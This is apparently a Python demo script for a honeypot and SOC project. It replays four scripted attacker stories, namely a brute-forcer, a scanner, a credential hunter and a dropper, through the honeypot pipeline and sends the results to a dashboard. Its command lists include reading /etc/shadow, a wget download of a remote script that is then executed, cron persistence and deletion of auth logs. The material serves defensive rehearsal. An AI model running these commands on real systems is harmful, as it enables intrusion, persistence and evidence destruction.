#!/usr/bin/env python3
"""Replay four attacker sessions through the REAL NetOsis pipeline into the SOC.

Nothing here is fabricated telemetry: each command runs through the same
VerticalSlicePipeline the honeypots use (deterministic engine, ATT&CK mapper,
policy ladder, persona, attack graph) and is shipped to the controller exactly
as a live honeypot would ship it. Use it to:
  * see the dashboard populated before a real attacker shows up,
  * rehearse the viva demo with repeatable stories.

  python scripts/soc_demo.py --controller http://192.168.40.31:8000 --token <ingest token>
  python scripts/soc_demo.py ... --speed 4        # 4x faster
  python scripts/soc_demo.py ... --loop           # keep going, new "attackers" each round

The four stories:
  203.0.113.24    brute-forcer      guesses logins, never gets in
  198.51.100.77   scanner           gets in, probes, leaves
  192.0.2.140     credential hunter reads shadow/history, pivots to finance-db-01
  203.0.113.201   dropper           pulls a script, makes it executable, adds cron

Every batch is sent with "demo": true and all source addresses are RFC 5737
documentation addresses, so the dashboard labels this as Demo data and the
globe places them only from controller/geo.py DEMO_FIXTURES (illustrative).
"""

from __future__ import annotations

import argparse
import json
import os
import random
import threading
import urllib.request
import sys
import tempfile
import time
import uuid
from pathlib import Path
from typing import Any

ROOT = Path(__file__).resolve().parents[1]
if str(ROOT) not in sys.path:
    sys.path.insert(0, str(ROOT))

from attack_graph.model.graph import AttackGraph  # noqa: E402
from controller.shipper import Shipper, ShippingTelemetryStore  # noqa: E402
from deception.runtime.host import Session, VirtualHost  # noqa: E402
from deception.runtime.pipeline import VerticalSlicePipeline  # noqa: E402
from deception.runtime.profile_store import ProfileStore  # noqa: E402
from telemetry.schema.events import TelemetryEvent, utc_now_iso  # noqa: E402

HOSTS = ROOT / "deception" / "hosts"

STORIES: list[dict] = [
    {
        "ip": "203.0.113.24", "host": "enterprise-web", "guess": 34,
        "users": ["root", "admin", "oracle", "ubuntu", "postgres", "test", "user", "pi"],
        "commands": [],
    },
    {
        "ip": "198.51.100.77", "host": "enterprise-web",
        "commands": ["uname -a", "id", "ps aux", "ip addr", "nmap -sV 192.168.30.0/24",
                     "ping -c 2 192.168.30.21", "ss -tulpn"],
    },
    {
        "ip": "192.0.2.140", "host": "enterprise-web",
        "commands": ["whoami", "ls -la", "cat notes.txt", "cat /etc/passwd | grep bash",
                     "history", "sudo cat /etc/shadow", "find / -perm -4000 2>/dev/null",
                     "cat ~/.config/ops/db.url", "ls Documents", "cat Documents/VPN_Migration_Steps_2024.txt",
                     "ssh dba@192.168.10.10"],
        "pivot": {"host": "finance-db", "user": "dba", "commands": [
            "whoami", "ls -la", "cat README.txt", "uname -a", "cat /etc/passwd", "ls /var/lib/postgresql"]},
    },
    {
        "ip": "203.0.113.201", "host": "enterprise-web",
        "commands": ["id", "uname -r", "cd /tmp", "wget http://185.220.101.1/x.sh", "ls -la",
                     "chmod +x x.sh", "./x.sh", "crontab -e", "echo '* * * * * /tmp/x.sh' >> /etc/crontab",
                     "rm -rf /var/log/auth.log"],
    },
]


def _sleep(base: float, speed: float) -> None:
    time.sleep(max(0.02, random.uniform(base * 0.6, base * 1.6) / speed))


def _auth_event(ip: str, host: VirtualHost, ok: bool, user: str, session_id: str) -> TelemetryEvent:
    return TelemetryEvent(
        timestamp=utc_now_iso(), session_id=session_id, actor_id=f"actor-{ip}", source_ip=ip,
        target_host=host.hostname, target_ip=host.ip,
        event_type="auth_success" if ok else "auth_failure", command="", result="",
        technique="T1078" if ok else "T1110", technique_name="Valid Accounts" if ok else "Brute Force",
        technique_confidence=0.6 if ok else 0.5, behavior="ssh_login", extra={"username": user},
    )


class Sensor:
    """One honeypot as the SOC sees it: its own shipper, graph and telemetry file."""

    def __init__(self, host_file: str, tmp: Path, ctid: int) -> None:
        self.host = VirtualHost.load(HOSTS / f"{host_file}.yml")
        self.shipper = Shipper(self.host.hostname, self.host.ip, ctid=ctid, demo=True)
        self.store = ShippingTelemetryStore(tmp / f"{self.host.hostname}.jsonl", self.shipper)
        self.graph = AttackGraph()
        self.profiles = ProfileStore(tmp / f"profiles-{self.host.hostname}")
        self.second = HOSTS / "finance-db.yml"

    def session(self, ip: str, user: str, session_id: str) -> tuple[Session, VerticalSlicePipeline]:
        host = VirtualHost.load(HOSTS / self.host.path.name)
        s = Session(host=host, session_id=session_id, actor_id=f"actor-{ip}", source_ip=ip, user=user)
        p = VerticalSlicePipeline(session=s, store=self.store, graph=self.graph,
                                  second_host_path=self.second, profile_store=self.profiles)
        return s, p

    def push(self, pipe: VerticalSlicePipeline) -> None:
        self.shipper.state(pipe.session.actor_id, lambda: pipe.profile.summary(),
                           lambda: self.graph.to_dict(), force=True)


# What a node agent on each CT would see right now (who is connected to whom).
LIVE: dict[str, Any] = {"web_peers": set(), "pivot": False}


def demo_agents(sensors: dict[str, "Sensor"], controller: str, token: str, stop: threading.Event) -> None:
    """Post node-agent reports (flagged demo) for the CTs that are powered on.

    The connection lists follow the stories above exactly; CPU/memory figures are
    illustrative, which is why every report carries "demo": true.
    """
    def report(name: str, ip: str, role: str, ctid: int | None, flows: list[dict], services: dict) -> None:
        body = {
            "demo": True,
            "agent": {"name": name, "role": role, "ctid": ctid, "version": "demo"},
            "host": {"hostname": name, "addresses": [ip], "uptime_s": int(time.time() - started),
                     "load": [round(random.uniform(0.05, 0.6), 2)] * 3, "cpu_pct": round(random.uniform(2, 18), 1),
                     "cpus": 2, "mem": {"total": 2 << 30, "used": int(random.uniform(0.35, 0.55) * (2 << 30))},
                     "disk": {"total": 8 << 30, "used": 3 << 30},
                     "net": {"rx_bps": random.randint(800, 9000), "tx_bps": random.randint(600, 7000)}},
            "services": services, "tcp": {"listening": [2222] if role == "honeypot" else [8000, 11434], "flows": flows},
        }
        req = urllib.request.Request(f"{controller}/v1/agent", data=json.dumps(body).encode(), method="POST",
                                     headers={"Content-Type": "application/json", "X-Netosis-Token": token})
        try:
            urllib.request.urlopen(req, timeout=3).read()
        except Exception:  # noqa: BLE001 — demo only
            pass

    started = time.time()
    while not stop.is_set():
        soc_in = []
        for key, sensor in list(sensors.items()):
            name, ip = sensor.host.hostname, sensor.host.ip
            flows = [{"dir": "out", "peer": "192.168.40.31", "port": 8000, "count": 1}]
            if key == "enterprise-web":
                flows += [{"dir": "in", "peer": p, "port": 2222, "count": 1} for p in sorted(LIVE["web_peers"])]
                if LIVE["pivot"]:
                    flows.append({"dir": "out", "peer": "192.168.10.10", "port": 2222, "count": 1})
            if key == "finance-db" and LIVE["pivot"]:
                flows.append({"dir": "in", "peer": "192.168.30.10", "port": 2222, "count": 1})
            report(name, ip, "honeypot", sensor.shipper.ctid, flows, {"netosis-ssh": "active"})
            soc_in.append({"dir": "in", "peer": ip, "port": 8000, "count": 1})
        report("controller", "192.168.40.31", "soc", None, soc_in,
               {"netosis-controller": "active", "ollama": "active"})
        stop.wait(5)


def run_story(story: dict, sensors: dict[str, Sensor], tmp: Path, speed: float) -> None:
    ip = story["ip"]
    web = sensors["enterprise-web"]
    sid = str(uuid.uuid4())
    print(f"\n[{ip}] arrives at {web.host.hostname}")

    if story.get("guess"):
        for i in range(story["guess"]):
            web.store.append(_auth_event(ip, web.host, False, random.choice(story["users"]), sid))
            _sleep(0.35, speed)
        print(f"[{ip}] gave up after {story['guess']} guesses")
        return

    for _ in range(random.randint(1, 3)):  # a couple of misses before the right guess
        web.store.append(_auth_event(ip, web.host, False, "root", sid))
        _sleep(0.5, speed)
    web.store.append(_auth_event(ip, web.host, True, "admin", sid))
    session, pipe = web.session(ip, "admin", sid)
    web.shipper.session_opened()
    LIVE["web_peers"].add(ip)

    for cmd in story["commands"]:
        _sleep(1.6, speed)
        _result, event, decision = pipe.run_command(cmd)
        web.push(pipe)
        print(f"  [{ip}] $ {cmd:<48} {event.technique or '-':<10} risk={decision.level}")
        if cmd.startswith("ssh ") and story.get("pivot"):
            _pivot(story, ip, pipe, sensors, tmp, speed)
    web.shipper.session_closed()
    LIVE["web_peers"].discard(ip)
    web.push(pipe)


def _pivot(story: dict, ip: str, pipe: VerticalSlicePipeline, sensors: dict[str, Sensor],
           tmp: Path, speed: float) -> None:
    plan = story["pivot"]
    fin = sensors.get("finance-db")
    if fin is None:  # the CT was powered off: it comes up only now (auto-wake)
        print(f"  [{ip}] finance-db-01 is off — waking it")
        fin = sensors["finance-db"] = Sensor("finance-db", tmp, ctid=104)
        time.sleep(2 / speed)
    sid = str(uuid.uuid4())
    event = TelemetryEvent(
        timestamp=utc_now_iso(), session_id=pipe.session.session_id, actor_id=pipe.session.actor_id,
        source_ip=ip, target_host=fin.host.hostname, target_ip=fin.host.ip, event_type="lateral_movement",
        command=f"ssh {plan['user']}@{fin.host.ip}", result="", technique="T1021.004",
        technique_name="Remote Services: SSH", technique_confidence=0.9, behavior="ssh_pivot",
        extra={"risk_category": "Lateral_movement", "from_host": pipe.session.host.hostname},
    )
    pipe.store.append(event)
    fin.store.append(_auth_event(ip, fin.host, True, plan["user"], sid))
    fin.shipper.session_opened()
    LIVE["pivot"] = True
    _s, fpipe = fin.session(ip, plan["user"], sid)
    for cmd in plan["commands"]:
        _sleep(1.4, speed)
        _r, ev, dec = fpipe.run_command(cmd)
        fin.push(fpipe)
        print(f"    [{ip}@finance-db-01] $ {cmd:<40} {ev.technique or '-':<10} risk={dec.level}")
    fin.shipper.session_closed()
    LIVE["pivot"] = False


def main(argv: list[str] | None = None) -> int:
    ap = argparse.ArgumentParser(description=__doc__.split("\n\n")[0])
    ap.add_argument("--controller", default=os.environ.get("NETOSIS_CONTROLLER_URL", "http://127.0.0.1:8000"))
    ap.add_argument("--token", default=os.environ.get("NETOSIS_INGEST_TOKEN", ""))
    ap.add_argument("--speed", type=float, default=1.0, help="2 = twice as fast")
    ap.add_argument("--loop", action="store_true")
    args = ap.parse_args(argv)

    os.environ["NETOSIS_CONTROLLER_URL"] = args.controller
    os.environ["NETOSIS_INGEST_TOKEN"] = args.token
    os.environ.setdefault("NETOSIS_LLM_MODE", "mock")  # demo never needs Ollama
    os.environ["NETOSIS_DATA_DIR"] = tempfile.mkdtemp(prefix="netosis-demo-")

    tmp = Path(tempfile.mkdtemp(prefix="netosis-demo-sensors-"))
    sensors = {"enterprise-web": Sensor("enterprise-web", tmp, ctid=102)}
    print(f"[*] shipping to {args.controller}  (finance-db-01 and ops-app-01 start powered off)")
    stop = threading.Event()
    threading.Thread(target=demo_agents, args=(sensors, args.controller.rstrip("/"), args.token, stop),
                     daemon=True).start()
    round_no = 0
    while True:
        round_no += 1
        for story in STORIES:
            s = dict(story)
            if round_no > 1:  # later rounds: same behaviours from fresh addresses
                s["ip"] = f"{random.choice(['192.0.2', '198.51.100', '203.0.113'])}.{random.randint(2, 253)}"
            run_story(s, sensors, tmp, args.speed)
            _sleep(2.5, args.speed)
        if not args.loop:
            break
    stop.set()
    time.sleep(1.5)  # let the shipper flush
    print("\n[*] done")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
